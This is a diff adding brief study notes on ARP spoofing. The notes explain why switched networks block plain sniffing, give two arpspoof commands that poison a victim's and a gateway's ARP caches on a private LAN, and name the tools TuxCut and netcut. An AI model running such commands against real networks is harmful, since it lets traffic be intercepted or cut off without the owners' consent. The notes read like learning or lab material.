@@ -1,0 +1,14 @@
+
+
+cannot sniff traffic on a switch - switch has isolated collision domains in switches
+it only sends traffic to the 1 physical port and to 1 mac address.
+
+attacker is default gateway
+
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+arpspoof -i eth0 192.168.1.1 192.168.1.10
+
+
+TuxCut
+
+arcai - netcut
